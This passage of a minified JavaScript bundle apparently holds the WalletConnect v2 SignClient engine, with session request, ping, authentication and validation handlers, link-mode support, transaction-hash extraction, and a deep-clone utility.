listeners`);Gi(i)?this.events.emit(Ni("session_extend",n),{}):wi(i)&&this.events.emit(Ni("session_extend",n),{error:i.error})}),Fe(this,"onSessionPingRequest",async(t,i)=>{const{id:n}=i;try{this.isValidPing({topic:t}),await this.sendResult({id:n,topic:t,result:!0,throwOnFailedPublish:!0}),this.client.events.emit("session_ping",{id:n,topic:t})}catch(s){await this.sendError({id:n,topic:t,error:s}),this.client.logger.error(s)}}),Fe(this,"onSessionPingResponse",(t,i)=>{const{id:n}=i,s=Ni("session_ping",n);setTimeout(()=>{if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners 2176`);Gi(i)?this.events.emit(Ni("session_ping",n),{}):wi(i)&&this.events.emit(Ni("session_ping",n),{error:i.error})},500)}),Fe(this,"onSessionDeleteRequest",async(t,i)=>{const{id:n}=i;try{this.isValidDisconnect({topic:t,reason:i.params}),Promise.all([new Promise(s=>{this.client.core.relayer.once(Fs.publish,async()=>{s(await this.deleteSession({topic:t,id:n}))})}),this.sendResult({id:n,topic:t,result:!0}),this.cleanupPendingSentRequestsForTopic({topic:t,error:gn("USER_DISCONNECTED")})]).catch(s=>this.client.logger.error(s))}catch(s){this.client.logger.error(s)}}),Fe(this,"onSessionRequest",async t=>{var i,n,s;const{topic:o,payload:a,attestation:c,encryptedId:l,transportType:u}=t,{id:d,params:h}=a;try{await this.isValidRequest(un({topic:o},h));const f=this.client.session.get(o),p=await this.getVerifyContext({attestationId:c,hash:ad(JSON.stringify(jn("wc_sessionRequest",h,d))),encryptedId:l,metadata:f.peer.metadata,transportType:u}),g={id:d,topic:o,params:h,verifyContext:p};await this.setPendingSessionRequest(g),u===fn.link_mode&&(i=f.peer.metadata.redirect)!=null&&i.universal&&this.client.core.addLinkModeSupportedApp((n=f.peer.metadata.redirect)==null?void 0:n.universal),(s=this.client.signConfig)!=null&&s.disableRequestQueue?this.emitSessionRequest(g):(this.addSessionRequestToSessionRequestQueue(g),this.processSessionRequestQueue())}catch(f){await this.sendError({id:d,topic:o,error:f}),this.client.logger.error(f)}}),Fe(this,"onSessionRequestResponse",(t,i)=>{const{id:n}=i,s=Ni("session_request",n);if(this.events.listenerCount(s)===0)throw new Error(`emitting ${s} without any listeners`);Gi(i)?this.events.emit(Ni("session_request",n),{result:i.result}):wi(i)&&this.events.emit(Ni("session_request",n),{error:i.error})}),Fe(this,"onSessionEventRequest",async(t,i)=>{const{id:n,params:s}=i;try{const o=`${t}_session_event_${s.event.name}`,a=Rb.get(o);if(a&&this.isRequestOutOfSync(a,n)){this.client.logger.info(`Discarding out of sync request - ${n}`);return}this.isValidEmit(un({topic:t},s)),this.client.events.emit("session_event",{id:n,topic:t,params:s}),Rb.set(o,n)}catch(o){await this.sendError({id:n,topic:t,error:o}),this.client.logger.error(o)}}),Fe(this,"onSessionAuthenticateResponse",(t,i)=>{const{id:n}=i;this.client.logger.trace({type:"method",method:"onSessionAuthenticateResponse",topic:t,payload:i}),Gi(i)?this.events.emit(Ni("session_request",n),{result:i.result}):wi(i)&&this.events.emit(Ni("session_request",n),{error:i.error})}),Fe(this,"onSessionAuthenticateRequest",async t=>{var i;const{topic:n,payload:s,attestation:o,encryptedId:a,transportType:c}=t;try{const{requester:l,authPayload:u,expiryTimestamp:d}=s.params,h=await this.getVerifyContext({attestationId:o,hash:ad(JSON.stringify(s)),encryptedId:a,metadata:l.metadata,transportType:c}),f={requester:l,pairingTopic:n,id:s.id,authPayload:u,verifyContext:h,expiryTimestamp:d};await this.setAuthRequest(s.id,{request:f,pairingTopic:n,transportType:c}),c===fn.link_mode&&(i=l.metadata.redirect)!=null&&i.universal&&this.client.core.addLinkModeSupportedApp(l.metadata.redirect.universal),this.client.events.emit("session_authenticate",{topic:n,params:s.params,id:s.id,verifyContext:h})}catch(l){this.client.logger.error(l);const u=s.params.requester.publicKey,d=await this.client.core.crypto.generateKeyPair(),h=this.getAppLinkIfEnabled(s.params.requester.metadata,c),f={type:r0,receiverPublicKey:u,senderPublicKey:d};await this.sendError({id:s.id,topic:n,error:l,encodeOpts:f,rpcOpts:$s.wc_sessionAuthenticate.autoReject,appLink:h})}}),Fe(this,"addSessionRequestToSessionRequestQueue",t=>{this.sessionRequestQueue.queue.push(t)}),Fe(this,"cleanupAfterResponse",t=>{this.deletePendingSessionRequest(t.response.id,{message:"fulfilled",code:0}),setTimeout(()=>{this.sessionRequestQueue.state=Vu.idle,this.processSessionRequestQueue()},fe.toMiliseconds(this.requestQueueDelay))}),Fe(this,"cleanupPendingSentRequestsForTopic",({topic:t,error:i})=>{const n=this.client.core.history.pending;n.length>0&&n.filter(s=>s.topic===t&&s.request.method==="wc_sessionRequest").forEach(s=>{const o=s.request.id,a=Ni("session_request",o);if(this.events.listenerCount(a)===0)throw new Error(`emitting ${a} without any listeners`);this.events.emit(Ni("session_request",s.request.id),{error:i})})}),Fe(this,"processSessionRequestQueue",()=>{if(this.sessionRequestQueue.state===Vu.active){this.client.logger.info("session request queue is already active.");return}const t=this.sessionRequestQueue.queue[0];if(!t){this.client.logger.info("session request queue is empty.");return}try{this.emitSessionRequest(t)}catch(i){this.client.logger.error(i)}}),Fe(this,"emitSessionRequest",t=>{if(this.emittedSessionRequests.has(t.id)){this.client.logger.warn({id:t.id},`Skipping emitting \`session_request\` event for duplicate request. id: ${t.id}`);return}this.sessionRequestQueue.state=Vu.active,this.emittedSessionRequests.add(t.id),this.client.events.emit("session_request",t)}),Fe(this,"onPairingCreated",t=>{if(t.methods&&this.expectedPairingMethodMap.set(t.topic,t.methods),t.active)return;const i=this.client.proposal.getAll().find(n=>n.pairingTopic===t.topic);i&&this.onSessionProposeRequest({topic:t.topic,payload:jn("wc_sessionPropose",ca(un({},i),{requiredNamespaces:i.requiredNamespaces,optionalNamespaces:i.optionalNamespaces,relays:i.relays,proposer:i.proposer,sessionProperties:i.sessionProperties,scopedProperties:i.scopedProperties}),i.id),attestation:i.attestation,encryptedId:i.encryptedId})}),Fe(this,"isValidConnect",async t=>{if(!wa(t)){const{message:l}=ot("MISSING_OR_INVALID",`connect() params: ${JSON.stringify(t)}`);throw new Error(l)}const{pairingTopic:i,requiredNamespaces:n,optionalNamespaces:s,sessionProperties:o,scopedProperties:a,relays:c}=t;if(co(i)||await this.isValidPairingTopic(i),!Fqe(c)){const{message:l}=ot("MISSING_OR_INVALID",`connect() relays: ${c}`);throw new Error(l)}if(!co(n)&&Ed(n)!==0){const l="requiredNamespaces are deprecated and are automatically assigned to optionalNamespaces";["fatal","error","silent"].includes(this.client.logger.level)?console.warn(l):this.client.logger.warn(l),this.validateNamespaces(n,"requiredNamespaces")}if(!co(s)&&Ed(s)!==0&&this.validateNamespaces(s,"optionalNamespaces"),co(o)||this.validateSessionProps(o,"sessionProperties"),!co(a)){this.validateSessionProps(a,"scopedProperties");const l=Object.keys(n||{}).concat(Object.keys(s||{}));if(!Object.keys(a).every(u=>l.includes(u.split(":")[0])))throw new Error(`Scoped properties must be a subset of required/optional namespaces, received: ${JSON.stringify(a)}, required/optional namespaces: ${JSON.stringify(l)}`)}}),Fe(this,"validateNamespaces",(t,i)=>{const n=jqe(t,"connect()",i);if(n)throw new Error(n.message)}),Fe(this,"isValidApprove",async t=>{if(!wa(t))throw new Error(ot("MISSING_OR_INVALID",`approve() params: ${t}`).message);const{id:i,namespaces:n,relayProtocol:s,sessionProperties:o,scopedProperties:a}=t;this.checkRecentlyDeleted(i),await this.isValidProposalId(i);const c=this.client.proposal.get(i),l=uI(n,"approve()");if(l)throw new Error(l.message);const u=IW(c.requiredNamespaces,n,"approve()");if(u)throw new Error(u.message);if(!ls(s,!0)){const{message:d}=ot("MISSING_OR_INVALID",`approve() relayProtocol: ${s}`);throw new Error(d)}if(co(o)||this.validateSessionProps(o,"sessionProperties"),!co(a)){this.validateSessionProps(a,"scopedProperties");const d=new Set(Object.keys(n));if(!Object.keys(a).every(h=>d.has(h.split(":")[0])))throw new Error(`Scoped properties must be a subset of approved namespaces, received: ${JSON.stringify(a)}, approved namespaces: ${Array.from(d).join(", ")}`)}}),Fe(this,"isValidReject",async t=>{if(!wa(t)){const{message:s}=ot("MISSING_OR_INVALID",`reject() params: ${t}`);throw new Error(s)}const{id:i,reason:n}=t;if(this.checkRecentlyDeleted(i),await this.isValidProposalId(i),!zqe(n)){const{message:s}=ot("MISSING_OR_INVALID",`reject() reason: ${JSON.stringify(n)}`);throw new Error(s)}}),Fe(this,"isValidSessionSettleRequest",t=>{if(!wa(t)){const{message:l}=ot("MISSING_OR_INVALID",`onSessionSettleRequest() params: ${t}`);throw new Error(l)}const{relay:i,controller:n,namespaces:s,expiry:o}=t;if(!Xre(i)){const{message:l}=ot("MISSING_OR_INVALID","onSessionSettleRequest() relay protocol should be a string");throw new Error(l)}const a=Oqe(n,"onSessionSettleRequest()");if(a)throw new Error(a.message);const c=uI(s,"onSessionSettleRequest()");if(c)throw new Error(c.message);if(xf(o)){const{message:l}=ot("EXPIRED","onSessionSettleRequest()");throw new Error(l)}}),Fe(this,"isValidUpdate",async t=>{if(!wa(t)){const{message:c}=ot("MISSING_OR_INVALID",`update() params: ${t}`);throw new Error(c)}const{topic:i,namespaces:n}=t;this.checkRecentlyDeleted(i),await this.isValidSessionTopic(i);const s=this.client.session.get(i),o=uI(n,"update()");if(o)throw new Error(o.message);const a=IW(s.requiredNamespaces,n,"update()");if(a)throw new Error(a.message)}),Fe(this,"isValidExtend",async t=>{if(!wa(t)){const{message:n}=ot("MISSING_OR_INVALID",`extend() params: ${t}`);throw new Error(n)}const{topic:i}=t;this.checkRecentlyDeleted(i),await this.isValidSessionTopic(i)}),Fe(this,"isValidRequest",async t=>{if(!wa(t)){const{message:c}=ot("MISSING_OR_INVALID",`request() params: ${t}`);throw new Error(c)}const{topic:i,request:n,chainId:s,expiry:o}=t;this.checkRecentlyDeleted(i),await this.isValidSessionTopic(i);const{namespaces:a}=this.client.session.get(i);if(!AW(a,s)){const{message:c}=ot("MISSING_OR_INVALID",`request() chainId: ${s}`);throw new Error(c)}if(!Wqe(n)){const{message:c}=ot("MISSING_OR_INVALID",`request() ${JSON.stringify(n)}`);throw new Error(c)}if(!Kqe(a,s,n.method)){const{message:c}=ot("MISSING_OR_INVALID",`request() method: ${n.method}`);throw new Error(c)}if(o&&!Jqe(o,wI)){const{message:c}=ot("MISSING_OR_INVALID",`request() expiry: ${o}. Expiry must be a number (in seconds) between ${wI.min} and ${wI.max}`);throw new Error(c)}}),Fe(this,"isValidRespond",async t=>{var i;if(!wa(t)){const{message:o}=ot("MISSING_OR_INVALID",`respond() params: ${t}`);throw new Error(o)}const{topic:n,response:s}=t;try{await this.isValidSessionTopic(n)}catch(o){throw(i=t?.response)!=null&&i.id&&this.cleanupAfterResponse(t),o}if(!Hqe(s)){const{message:o}=ot("MISSING_OR_INVALID",`respond() response: ${JSON.stringify(s)}`);throw new Error(o)}}),Fe(this,"isValidPing",async t=>{if(!wa(t)){const{message:n}=ot("MISSING_OR_INVALID",`ping() params: ${t}`);throw new Error(n)}const{topic:i}=t;await this.isValidSessionOrPairingTopic(i)}),Fe(this,"isValidEmit",async t=>{if(!wa(t)){const{message:a}=ot("MISSING_OR_INVALID",`emit() params: ${t}`);throw new Error(a)}const{topic:i,event:n,chainId:s}=t;await this.isValidSessionTopic(i);const{namespaces:o}=this.client.session.get(i);if(!AW(o,s)){const{message:a}=ot("MISSING_OR_INVALID",`emit() chainId: ${s}`);throw new Error(a)}if(!Vqe(n)){const{message:a}=ot("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(n)}`);throw new Error(a)}if(!Gqe(o,s,n.name)){const{message:a}=ot("MISSING_OR_INVALID",`emit() event: ${JSON.stringify(n)}`);throw new Error(a)}}),Fe(this,"isValidDisconnect",async t=>{if(!wa(t)){const{message:n}=ot("MISSING_OR_INVALID",`disconnect() params: ${t}`);throw new Error(n)}const{topic:i}=t;await this.isValidSessionOrPairingTopic(i)}),Fe(this,"isValidAuthenticate",t=>{const{chains:i,uri:n,domain:s,nonce:o}=t;if(!Array.isArray(i)||i.length===0)throw new Error("chains is required and must be a non-empty array");if(!ls(n,!1))throw new Error("uri is required parameter");if(!ls(s,!1))throw new Error("domain is required parameter");if(!ls(o,!1))throw new Error("nonce is required parameter");if([...new Set(i.map(c=>uw(c).namespace))].length>1)throw new Error("Multi-namespace requests are not supported. Please request single namespace only.");const{namespace:a}=uw(i[0]);if(a!=="eip155")throw new Error("Only eip155 namespace is supported for authenticated sessions. Please use .connect() for non-eip155 chains.")}),Fe(this,"getVerifyContext",async t=>{const{attestationId:i,hash:n,encryptedId:s,metadata:o,transportType:a}=t,c={verified:{verifyUrl:o.verifyUrl||q5,validation:"UNKNOWN",origin:o.url||""}};try{if(a===fn.link_mode){const u=this.getAppLinkIfEnabled(o,a);return c.verified.validation=u&&new URL(u).origin===new URL(o.url).origin?"VALID":"INVALID",c}const l=await this.client.core.verify.resolve({attestationId:i,hash:n,encryptedId:s,verifyUrl:o.verifyUrl});l&&(c.verified.origin=l.origin,c.verified.isScam=l.isScam,c.verified.validation=l.origin===new URL(o.url).origin?"VALID":"INVALID")}catch(l){this.client.logger.warn(l)}return this.client.logger.debug(`Verify context: ${JSON.stringify(c)}`),c}),Fe(this,"validateSessionProps",(t,i)=>{Object.values(t).forEach((n,s)=>{if(n==null){const{message:o}=ot("MISSING_OR_INVALID",`${i} must contain an existing value for each key. Received: ${n} for key ${Object.keys(t)[s]}`);throw new Error(o)}})}),Fe(this,"getPendingAuthRequest",t=>{const i=this.client.auth.requests.get(t);return typeof i=="object"?i:void 0}),Fe(this,"addToRecentlyDeleted",(t,i)=>{if(this.recentlyDeletedMap.set(t,i),this.recentlyDeletedMap.size>=this.recentlyDeletedLimit){let n=0;const s=this.recentlyDeletedLimit/2;for(const o of this.recentlyDeletedMap.keys()){if(n++>=s)break;this.recentlyDeletedMap.delete(o)}}}),Fe(this,"checkRecentlyDeleted",t=>{const i=this.recentlyDeletedMap.get(t);if(i){const{message:n}=ot("MISSING_OR_INVALID",`Record was recently deleted - ${i}: ${t}`);throw new Error(n)}}),Fe(this,"isLinkModeEnabled",(t,i)=>{var n,s,o,a,c,l,u,d,h;return!t||i!==fn.link_mode?!1:((s=(n=this.client.metadata)==null?void 0:n.redirect)==null?void 0:s.linkMode)===!0&&((a=(o=this.client.metadata)==null?void 0:o.redirect)==null?void 0:a.universal)!==void 0&&((l=(c=this.client.metadata)==null?void 0:c.redirect)==null?void 0:l.universal)!==""&&((u=t?.redirect)==null?void 0:u.universal)!==void 0&&((d=t?.redirect)==null?void 0:d.universal)!==""&&((h=t?.redirect)==null?void 0:h.linkMode)===!0&&this.client.core.linkModeSupportedApps.includes(t.redirect.universal)&&typeof(global==null?void 0:global.Linking)<"u"}),Fe(this,"getAppLinkIfEnabled",(t,i)=>{var n;return this.isLinkModeEnabled(t,i)?(n=t?.redirect)==null?void 0:n.universal:void 0}),Fe(this,"handleLinkModeMessage",({url:t})=>{if(!t||!t.includes("wc_ev")||!t.includes("topic"))return;const i=jz(t,"topic")||"",n=decodeURIComponent(jz(t,"wc_ev")||""),s=this.client.session.keys.includes(i);s&&this.client.session.update(i,{transportType:fn.link_mode}),this.client.core.dispatchEnvelope({topic:i,message:n,sessionExists:s})}),Fe(this,"registerLinkModeListeners",async()=>{var t;if(vO()||Bp()&&(t=this.client.metadata.redirect)!=null&&t.linkMode){const i=global==null?void 0:global.Linking;if(typeof i<"u"){i.addEventListener("url",this.handleLinkModeMessage,this.client.name);const n=await i.getInitialURL();n&&setTimeout(()=>{this.handleLinkModeMessage({url:n})},50)}}}),Fe(this,"getTVFParams",(t,i,n)=>{var s,o,a;if(!((s=i.request)!=null&&s.method))return{};const c={correlationId:t,rpcMethods:[i.request.method],chainId:i.chainId};try{const l=this.extractTxHashesFromResult(i.request,n);c.txHashes=l,c.contractAddresses=this.isValidContractData(i.request.params)?[(a=(o=i.request.params)==null?void 0:o[0])==null?void 0:a.to]:[]}catch(l){this.client.logger.warn("Error getting TVF params",l)}return c}),Fe(this,"isValidContractData",t=>{var i;if(!t)return!1;try{const n=t?.data||((i=t?.[0])==null?void 0:i.data);if(!n.startsWith("0x"))return!1;const s=n.slice(2);return/^[0-9a-fA-F]*$/.test(s)?s.length%2===0:!1}catch{}return!1}),Fe(this,"extractTxHashesFromResult",(t,i)=>{var n;try{if(!i)return[];const s=t.method,o=vKe[s];if(s==="sui_signTransaction")return[yje(i.transactionBytes)];if(s==="near_signTransaction")return[Gz(i)];if(s==="near_signTransactions")return i.map(c=>Gz(c));if(s==="xrpl_signTransactionFor"||s==="xrpl_signTransaction")return[(n=i.tx_json)==null?void 0:n.hash];if(s==="polkadot_signTransaction")return[hze({transaction:t.params.transactionPayload,signature:i.signature})];if(s==="algo_signTxn")return il(i)?i.map(c=>Zz(c)):[Zz(i)];if(s==="cosmos_signDirect")return[Cje(i)];if(typeof i=="string")return[i];const a=i[o.key];if(il(a))return s==="solana_signAllTransactions"?a.map(c=>vje(c)):a;if(typeof a=="string")return[a]}catch(s){this.client.logger.warn("Error extracting tx hashes from result",s)}return[]})}async processPendingMessageEvents(){try{const e=this.client.session.keys,t=this.client.core.relayer.messages.getWithoutAck(e);for(const[i,n]of Object.entries(t))for(const s of n)try{await this.onProviderMessageEvent({topic:i,message:s,publishedAt:Date.now()})}catch{this.client.logger.warn(`Error processing pending message event for topic: ${i}, message: ${s}`)}}catch(e){this.client.logger.warn("processPendingMessageEvents failed",e)}}isInitialized(){if(!this.initialized){const{message:e}=ot("NOT_INITIALIZED",this.name);throw new Error(e)}}async confirmOnlineStateOrThrow(){await this.client.core.relayer.confirmOnlineStateOrThrow()}registerRelayerEvents(){this.client.core.relayer.on(Fs.message,e=>{this.onProviderMessageEvent(e)})}async onRelayMessage(e){const{topic:t,message:i,attestation:n,transportType:s}=e,{publicKey:o}=this.client.auth.authKeys.keys.includes(C9)?this.client.auth.authKeys.get(C9):{publicKey:void 0};try{const a=await this.client.core.crypto.decode(t,i,{receiverPublicKey:o,encoding:s===fn.link_mode?Tf:lu});N0(a)?(this.client.core.history.set(t,a),await this.onRelayEventRequest({topic:t,payload:a,attestation:n,transportType:s,encryptedId:ad(i)})):Jd(a)?(await this.client.core.history.resolve(a),await this.onRelayEventResponse({topic:t,payload:a,transportType:s}),this.client.core.history.delete(t,a.id)):await this.onRelayEventUnknownPayload({topic:t,payload:a,transportType:s}),await this.client.core.relayer.messages.ack(t,i)}catch(a){this.client.logger.error(a)}}registerExpirerEvents(){this.client.core.expirer.on(Gc.expired,async e=>{const{topic:t,id:i}=are(e.target);if(i&&this.client.pendingRequest.keys.includes(i))return await this.deletePendingSessionRequest(i,ot("EXPIRED"),!0);if(i&&this.client.auth.requests.keys.includes(i))return await this.deletePendingAuthRequest(i,ot("EXPIRED"),!0);t?this.client.session.keys.includes(t)&&(await this.deleteSession({topic:t,expirerHasDeleted:!0}),this.client.events.emit("session_expire",{topic:t})):i&&(await this.deleteProposal(i,!0),this.client.events.emit("proposal_expire",{id:i}))})}registerPairingEvents(){this.client.core.pairing.events.on(l1.create,e=>this.onPairingCreated(e)),this.client.core.pairing.events.on(l1.delete,e=>{this.addToRecentlyDeleted(e.topic,"pairing")})}isValidPairingTopic(e){if(!ls(e,!1)){const{message:t}=ot("MISSING_OR_INVALID",`pairing topic should be a string: ${e}`);throw new Error(t)}if(!this.client.core.pairing.pairings.keys.includes(e)){const{message:t}=ot("NO_MATCHING_KEY",`pairing topic doesn't exist: ${e}`);throw new Error(t)}if(xf(this.client.core.pairing.pairings.get(e).expiry)){const{message:t}=ot("EXPIRED",`pairing topic: ${e}`);throw new Error(t)}}async isValidSessionTopic(e){if(!ls(e,!1)){const{message:t}=ot("MISSING_OR_INVALID",`session topic should be a string: ${e}`);throw new Error(t)}if(this.checkRecentlyDeleted(e),!this.client.session.keys.includes(e)){const{message:t}=ot("NO_MATCHING_KEY",`session topic doesn't exist: ${e}`);throw new Error(t)}if(xf(this.client.session.get(e).expiry)){await this.deleteSession({topic:e});const{message:t}=ot("EXPIRED",`session topic: ${e}`);throw new Error(t)}if(!this.client.core.crypto.keychain.has(e)){const{message:t}=ot("MISSING_OR_INVALID",`session topic does not exist in keychain: ${e}`);throw await this.deleteSession({topic:e}),new Error(t)}}async isValidSessionOrPairingTopic(e){if(this.checkRecentlyDeleted(e),this.client.session.keys.includes(e))await this.isValidSessionTopic(e);else if(this.client.core.pairing.pairings.keys.includes(e))this.isValidPairingTopic(e);else if(ls(e,!1)){const{message:t}=ot("NO_MATCHING_KEY",`session or pairing topic doesn't exist: ${e}`);throw new Error(t)}else{const{message:t}=ot("MISSING_OR_INVALID",`session or pairing topic should be a string: ${e}`);throw new Error(t)}}async isValidProposalId(e){if(!qqe(e)){const{message:t}=ot("MISSING_OR_INVALID",`proposal id should be a number: ${e}`);throw new Error(t)}if(!this.client.proposal.keys.includes(e)){const{message:t}=ot("NO_MATCHING_KEY",`proposal id doesn't exist: ${e}`);throw new Error(t)}if(xf(this.client.proposal.get(e).expiryTimestamp)){await this.deleteProposal(e);const{message:t}=ot("EXPIRED",`proposal id: ${e}`);throw new Error(t)}}},RKe=class extends C2{constructor(e,t){super(e,t,mKe,RO),this.core=e,this.logger=t}},OKe=class extends C2{constructor(e,t){super(e,t,wKe,RO),this.core=e,this.logger=t}},BKe=class extends C2{constructor(e,t){super(e,t,yKe,RO,i=>i.id),this.core=e,this.logger=t}},MKe=class extends C2{constructor(e,t){super(e,t,_Ke,rE,()=>C9),this.core=e,this.logger=t}},DKe=class extends C2{constructor(e,t){super(e,t,SKe,rE),this.core=e,this.logger=t}},LKe=class extends C2{constructor(e,t){super(e,t,AKe,rE,i=>i.id),this.core=e,this.logger=t}};var UKe=Object.defineProperty,jKe=(r,e,t)=>e in r?UKe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,bI=(r,e,t)=>jKe(r,typeof e!="symbol"?e+"":e,t);let FKe=class{constructor(e,t){this.core=e,this.logger=t,bI(this,"authKeys"),bI(this,"pairingTopics"),bI(this,"requests"),this.authKeys=new MKe(this.core,this.logger),this.pairingTopics=new DKe(this.core,this.logger),this.requests=new LKe(this.core,this.logger)}async init(){await this.authKeys.init(),await this.pairingTopics.init(),await this.requests.init()}};var qKe=Object.defineProperty,zKe=(r,e,t)=>e in r?qKe(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Gr=(r,e,t)=>zKe(r,typeof e!="symbol"?e+"":e,t);let WKe=class yie extends Pze{constructor(e){super(e),Gr(this,"protocol",wie),Gr(this,"version",bie),Gr(this,"name",mI.name),Gr(this,"metadata"),Gr(this,"core"),Gr(this,"logger"),Gr(this,"events",new en.EventEmitter),Gr(this,"engine"),Gr(this,"session"),Gr(this,"proposal"),Gr(this,"pendingRequest"),Gr(this,"auth"),Gr(this,"signConfig"),Gr(this,"on",(i,n)=>this.events.on(i,n)),Gr(this,"once",(i,n)=>this.events.once(i,n)),Gr(this,"off",(i,n)=>this.events.off(i,n)),Gr(this,"removeListener",(i,n)=>this.events.removeListener(i,n)),Gr(this,"removeAllListeners",i=>this.events.removeAllListeners(i)),Gr(this,"connect",async i=>{try{return await this.engine.connect(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"pair",async i=>{try{return await this.engine.pair(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"approve",async i=>{try{return await this.engine.approve(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"reject",async i=>{try{return await this.engine.reject(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"update",async i=>{try{return await this.engine.update(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"extend",async i=>{try{return await this.engine.extend(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"request",async i=>{try{return await this.engine.request(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"respond",async i=>{try{return await this.engine.respond(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"ping",async i=>{try{return await this.engine.ping(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"emit",async i=>{try{return await this.engine.emit(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"disconnect",async i=>{try{return await this.engine.disconnect(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"find",i=>{try{return this.engine.find(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"getPendingSessionRequests",()=>{try{return this.engine.getPendingSessionRequests()}catch(i){throw this.logger.error(i.message),i}}),Gr(this,"authenticate",async(i,n)=>{try{return await this.engine.authenticate(i,n)}catch(s){throw this.logger.error(s.message),s}}),Gr(this,"formatAuthMessage",i=>{try{return this.engine.formatAuthMessage(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"approveSessionAuthenticate",async i=>{try{return await this.engine.approveSessionAuthenticate(i)}catch(n){throw this.logger.error(n.message),n}}),Gr(this,"rejectSessionAuthenticate",async i=>{try{return await this.engine.rejectSessionAuthenticate(i)}catch(n){throw this.logger.error(n.message),n}}),this.name=e?.name||mI.name,this.metadata=dUe(e?.metadata),this.signConfig=e?.signConfig;const t=typeof e?.logger<"u"&&typeof e?.logger!="string"?e.logger:Iu(ra({level:e?.logger||mI.logger}));this.core=e?.core||new gKe(e),this.logger=gr(t,this.name),this.session=new OKe(this.core,this.logger),this.proposal=new RKe(this.core,this.logger),this.pendingRequest=new BKe(this.core,this.logger),this.engine=new $Ke(this),this.auth=new FKe(this.core,this.logger)}static async init(e){const t=new yie(e);return await t.initialize(),t}get context(){return Or(this.logger)}get pairing(){return this.core.pairing.pairings}async initialize(){this.logger.trace("Initialized");try{await this.core.start(),await this.session.init(),await this.proposal.init(),await this.pendingRequest.init(),await this.auth.init(),await this.engine.init(),this.logger.info("SignClient Initialization Success")}catch(e){throw this.logger.info("SignClient Initialization Failure"),this.logger.error(e.message),e}}};const sH="error",HKe="wss://relay.walletconnect.org",VKe="wc",KKe="universal_provider",b8=`${VKe}@2:${KKe}:`,xie="https://rpc.walletconnect.org/v1/",Um="generic",GKe=`${xie}bundler`,El={DEFAULT_CHAIN_CHANGED:"default_chain_changed"};function OO(r){return r==null||typeof r!="object"&&typeof r!="function"}function Cie(r){return Object.getOwnPropertySymbols(r).filter(e=>Object.prototype.propertyIsEnumerable.call(r,e))}function Eie(r){return r==null?r===void 0?"[object Undefined]":"[object Null]":Object.prototype.toString.call(r)}const ZKe="[object RegExp]",_ie="[object String]",Sie="[object Number]",Aie="[object Boolean]",Iie="[object Arguments]",YKe="[object Symbol]",JKe="[object Date]",QKe="[object Map]",XKe="[object Set]",eGe="[object Array]",tGe="[object ArrayBuffer]",rGe="[object Object]",iGe="[object DataView]",nGe="[object Uint8Array]",sGe="[object Uint8ClampedArray]",oGe="[object Uint16Array]",aGe="[object Uint32Array]",cGe="[object Int8Array]",lGe="[object Int16Array]",uGe="[object Int32Array]",dGe="[object Float32Array]",hGe="[object Float64Array]";function BO(r){return ArrayBuffer.isView(r)&&!(r instanceof DataView)}function fGe(r,e){return Zm(r,void 0,r,new Map,e)}function Zm(r,e,t,i=new Map,n=void 0){const s=n?.(r,e,t,i);if(s!=null)return s;if(OO(r))return r;if(i.has(r))return i.get(r);if(Array.isArray(r)){const o=new Array(r.length);i.set(r,o);for(let a=0;a<r.length;a++)o[a]=Zm(r[a],a,t,i,n);return Object.hasOwn(r,"index")&&(o.index=r.index),Object.hasOwn(r,"input")&&(o.input=r.input),o}if(r instanceof Date)return new Date(r.getTime());if(r instanceof RegExp){const o=new RegExp(r.source,r.flags);return o.lastIndex=r.lastIndex,o}if(r instanceof Map){const o=new Map;i.set(r,o);for(const[a,c]of r)o.set(a,Zm(c,a,t,i,n));return o}if(r instanceof Set){const o=new Set;i.set(r,o);for(const a of r)o.add(Zm(a,void 0,t,i,n));return o}if(typeof Buffer<"u"&&Buffer.isBuffer(r))return r.subarray();if(BO(r)){const o=new(Object.getPrototypeOf(r)).constructor(r.length);i.set(r,o);for(let a=0;a<r.length;a++)o[a]=Zm(r[a],a,t,i,n);return o}if(r instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&r instanceof SharedArrayBuffer)return r.slice(0);if(r instanceof DataView){const o=new DataView(r.buffer.slice(0),r.byteOffset,r.byteLength);return i.set(r,o),u1(o,r,t,i,n),o}if(typeof File<"u"&&r instanceof File){const o=new File([r],r.name,{type:r.type});return i.set(r,o),u1(o,r,t,i,n),o}if(r instanceof Blob){const o=new Blob([r],{type:r.type});return i.set(r,o),u1(o,r,t,i,n),o}if(r instanceof Error){const o=new r.constructor;return i.set(r,o),o.message=r.message,o.name=r.name,o.stack=r.stack,o.cause=r.cause,u1(o,r,t,i,n),o}if(typeof r=="object"&&pGe(r)){const o=Object.create(Object.getPrototypeOf(r));return i.set(r,o),u1(o,r,t,i,n),o}return r}function u1(r,e,t=r,i,n){const s=[...Object.keys(e),...Cie(e)];for(let o=0;o<s.length;o++){const a=s[o],c=Object.getOwnPropertyDescriptor(r,a);(c==null||c.writable)&&(r[a]=Zm(e[a],a,t,i,n))}}function pGe(r){switch(Eie(r)){case Iie:case eGe:case tGe:case iGe:case Aie:case JKe:case dGe:case hGe:case cGe:case lGe:case uGe:case QKe:case Sie:case rGe:case ZKe:case XKe:case _ie:case YKe:case nGe:case sGe:case oGe:case aGe:return!0;default:return!1}}function gGe(r,e){return fGe(r,(t,i,n,s)=>{if(typeof r=="object")switch(Object.prototype.toString.call(r)){case Sie:case _ie:case Aie:{const o=new r.constructor(r?.valueOf());return u1(o,r),o}case Iie:{const o={};return u1(o,r),o.length=r.length,o[Symbol.iterator]=r[Symbol.iterator],o}default:return}})}function oH(r){return gGe(r)}function aH(r){return r!==null&&typeof 